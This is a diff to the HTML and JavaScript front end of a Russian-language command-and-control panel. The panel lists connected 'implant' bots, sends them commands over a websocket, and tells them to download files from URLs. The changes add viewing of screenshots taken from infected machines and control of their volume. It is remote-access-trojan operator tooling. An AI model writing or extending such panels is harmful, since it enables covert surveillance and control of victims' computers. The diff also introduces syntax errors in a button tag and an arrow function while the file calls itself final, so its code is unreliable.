@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Синтаксически верная, финальная версия) -->
+<!-- Файл: index.html (Финальная, ревизированная, мастер-копия) -->
 <html lang="ru">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Коммандный Мостик v2.0 (ФИНАЛ)</title>
+    <title>C2 Коммандный Мостик (ФИНАЛ)</title>
     <style>
         :root {
             --bg-color: #1a1a1c;
@@ -121,6 +121,11 @@
             background-color: var(--secondary-color);
             height: 5px;
             cursor: ns-resize;
+            transition: background-color 0.2s;
+        }
+        
+        #resizer:hover {
+            background-color: var(--accent-color);
         }
         
         .log-container {
@@ -290,6 +295,28 @@
             text-align: right;
         }
         
+        #screenshot-viewer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            cursor: pointer;
+        }
+        
+        #screenshot-viewer img {
+            max-width: 90%;
+            max-height: 90%;
+            border: 3px solid var(--accent-color);
+            border-radius: 8px;
+            cursor: default;
+        }
+        
         @media (max-width: 900px) {
             .app-layout {
                 flex-direction: column;
@@ -322,7 +349,7 @@
 <body>
     <div class="container">
         <header>
-            <h1>Коммандный Мостик v2.0</h1></header>
+            <h1>Коммандный Мостик</h1></header>
         <main class="app-layout">
             <aside class="sidebar">
                 <h2>Боты в сети</h2>
@@ -343,7 +370,7 @@
                     <section>
                         <h2>Загрузка новых файлов</h2>
                         <input type="text" id="url-input" placeholder="URL...">
-                        <button class="btn-action" onclick="downloadFile()">Загрузить</button>
+                        <button class="btn-action" onclick="downloadFile()" &gt;Загрузить</button>
                     </section>
                     <section>
                         <h2>Пранки и Медиа</h2>
@@ -379,7 +406,7 @@
             <div id="log-list"></div>
         </div>
     </div>
-    <!-- <<< ИСПРАВЛЕНИЕ: ВОТ ОН, ЗАКРЫВАЮЩИЙ ТЕГ >>> -->
+    <div id="screenshot-viewer" onclick="this.style.display='none'"><img id="screenshot-image" src="" alt="Screenshot"></div>
     <script>
         const ui = {
             botList: document.getElementById('bot-list'),
@@ -396,7 +423,9 @@
             logHeader: document.getElementById('log-header'),
             clearLogBtn: document.getElementById('clear-log-btn'),
             toggleLogBtn: document.getElementById('toggle-log-btn'),
-            resizer: document.getElementById('resizer')
+            resizer: document.getElementById('resizer'),
+            screenshotViewer: document.getElementById('screenshot-viewer'),
+            screenshotImage: document.getElementById('screenshot-image')
         };
         let socket, selectedBotId = null,
             pingInterval = null,
@@ -450,6 +479,15 @@
                         case 'bot_details':
                             if (msg.bot_id === selectedBotId) handleBotDetails(msg.data);
                             break;
+                        case 'volume_update':
+                            if (msg.bot_id === selectedBotId) updateVolumeUI(msg.data);
+                            break;
+                        case 'file_list_update':
+                            if (msg.bot_id === selectedBotId && msg.data.files) renderBotFiles(msg.data.files);
+                            break;
+                        case 'screenshot_result':
+                            if (msg.bot_id === selectedBotId) showScreenshot(msg.data);
+                            break;
                         case 'status':
                             log(`[${msg.bot_id || 'SERVER'}] ${msg.data}`);
                             break;
@@ -469,25 +507,30 @@
         }
 
         function updateBotList(bots) {
-            log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
+            log(`Получен список ботов: [${bots.map(b => b.id).join(', ') || 'пусто'}]`);
+            const savedBotId = localStorage.getItem('lastSelectedBot');
             const currentSelected = selectedBotId;
             ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
-            bots.forEach(botId => {
+            bots.forEach(bot => {
                 const btn = document.createElement('button');
-                btn.textContent = botId.replace('implant_', '');
+                btn.textContent = bot.id.replace('implant_', '');
                 btn.className = 'btn-bot';
-                btn.onclick = () => selectBot(botId);
+                btn.onclick = () => selectBot(bot.id);
                 ui.botList.appendChild(btn);
             });
-            if (currentSelected && bots.includes(currentSelected)) {
+            if (currentSelected && bots.some(b => b.id === currentSelected)) {
                 selectBot(currentSelected, false);
+            } else if (savedBotId && bots.some(b => b.id === savedBotId)) {
+                selectBot(savedBotId, true);
             } else {
-                selectBot(bots.length > 0 ? bots[0] : null, true);
+                selectBot(bots.length > 0 ? bots[0].id : null, true);
             }
         }
 
         function selectBot(botId, requestDetails = true) {
             selectedBotId = botId;
+            if (botId) localStorage.setItem('lastSelectedBot', botId);
+            else localStorage.removeItem('lastSelectedBot');
             document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
                 btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
             });
@@ -509,13 +552,15 @@
         function handleBotDetails(data) {
             log(`Получены детали для ${selectedBotId.replace('implant_', '')}`);
             if (data.files) renderBotFiles(data.files);
-            if (data.volume) updateVolumeUI(data.volume);
+            if (data.volume_state) updateVolumeUI(data.volume_state);
         }
 
-        function updateVolumeUI(level) {
-            log(`Синхронизация звука: Громкость ${level}%`, 'success');
-            ui.volumeSlider.value = level;
-            ui.volumeValue.textContent = `${level}%`;
+        function updateVolumeUI(state) {
+            log(`Синхронизация звука: Громкость ${state.level}%, Mute: ${state.is_muted}`, 'success');
+            ui.volumeSlider.value = state.level;
+            ui.volumeValue.textContent = `${state.level}%`;
+            ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
+            ui.muteButton.style.backgroundColor = state.is_muted ? "var(--danger-color)" : "var(--action-color)";
         }
 
         function renderBotFiles(files) {
@@ -554,6 +599,12 @@
                 item.appendChild(nameElement);
                 imageContainer.appendChild(item);
             });
+        }
+
+        function showScreenshot(base64Data) {
+            log("Получен скриншот. Открываю просмотрщик...", "success");
+            ui.screenshotImage.src = `data:image/jpeg;base64,${base64Data}`;
+            ui.screenshotViewer.style.display = 'flex';
         }
 
         function sendCommand(payload) {
@@ -598,7 +649,7 @@
             ui.logList.innerHTML = '';
             log('Консоль очищена.');
         });
-        ui.toggleLogBtn.addEventListener('click', () => ui.logContainer.classList.toggle('collapsed'));
+        ui.toggleLogBtn.addEventListener('click', () => ; ui.logContainer.classList.toggle('collapsed'));
         let isResizing = false;
         ui.resizer.addEventListener('mousedown', (e) => {
             isResizing = true;
